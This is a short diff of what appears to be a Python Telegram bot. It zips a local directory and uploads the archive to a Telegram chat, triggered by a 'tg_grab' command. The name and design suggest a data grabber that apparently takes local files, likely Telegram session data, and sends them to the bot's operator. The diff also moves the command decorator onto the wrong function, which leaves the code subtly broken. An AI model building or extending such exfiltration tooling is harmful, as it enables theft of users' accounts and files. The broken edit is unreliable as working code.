@@ -303,6 +303,7 @@ def start(message):
     itembtn11 = types.KeyboardButton('/code')
     markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
+@bot.message_handler(commands=['tg_grab'])
 def create_zip_archive(source_dir, output_zip):
     try:
         with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
@@ -359,7 +360,6 @@ def send_file_to_telegram(file_path, file_name):
     if response.status_code != 200:
         print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
         print(response.text)
-@bot.message_handler(commands=['tg_grab'])
 def handle_tg_grab_command(message):
     thread = threading.Thread(target=archive_and_send2)
     thread.start()
